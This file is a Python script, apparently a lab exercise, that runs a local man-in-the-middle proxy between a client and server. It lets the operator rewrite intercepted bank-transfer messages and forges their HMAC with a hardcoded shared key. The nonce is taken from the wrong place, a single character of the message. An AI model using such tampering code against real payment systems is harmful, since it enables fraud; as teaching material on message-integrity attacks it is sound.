import socket
import hmac

MITM_HOST = "127.0.0.1"
MITM_PORT = 3031  # Puerto 3031 para el man-in-the-middle

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 3030  # Puerto 3030 para el servidor real

def calcular_hmac(mensaje):
    clave = "contraseña"
    algoritmo = 'sha256'
    hmac_obj = hmac.new(clave.encode(), mensaje.encode(), algoritmo)
    hmac_hex = hmac_obj.hexdigest()
    return hmac_hex

def obtener_datos_mensaje(nonce):
    CuentaOrigen = input("Ingrese la cuenta origen: ")
    CuentaDestino = input("Ingrese la cuenta destino: ")
    Cantidad = input("Ingrese la cantidad: ")
    Nonce = nonce
    mensaje = f"{CuentaOrigen},{CuentaDestino},{Cantidad},{Nonce}"
    return mensaje

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((MITM_HOST, MITM_PORT))
        s.listen()
        print(f"Man-in-the-middle listening on {MITM_HOST}:{MITM_PORT}")

        client_socket, addr = s.accept()
        print(f"Conexión desde el cliente: {addr}")

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
            server_socket.connect((SERVER_HOST, SERVER_PORT))  # Conectar al servidor real

            while True:
                # Recibir el mensaje del cliente
                client_data = client_socket.recv(1024)
                if not client_data:
                    break

                # Separar el mensaje y el hash
                s = client_data.decode("utf-8").split(";")
                mensaje_cliente = s[0]

                # Mostrar el mensaje recibido del cliente
                print(f"Mensaje recibido del cliente: {mensaje_cliente}")
                print(client_data.decode("utf-8"))
                mod = input('¿Quieres modificar el mensaje recibido? \n 1.Si \n 2.No\n')
                if mod=='1':
                    # Pedir al usuario que modifique los datos
                    mensaje_modificado = obtener_datos_mensaje(mensaje_cliente[3])
                    hmac_modificado = calcular_hmac(mensaje_modificado)
                    mensaje_enviar = f"{mensaje_modificado};{hmac_modificado}"
                    server_socket.sendall(mensaje_enviar.encode('utf-8'))
                else:
                    mensaje_enviar = client_data
                    # Enviar el mensaje modificado al servidor
                    server_socket.sendall(mensaje_enviar)

                # Recibir la respuesta del servidor
                server_response = server_socket.recv(1024)
                client_socket.sendall(server_response)

if __name__ == "__main__":
    main()
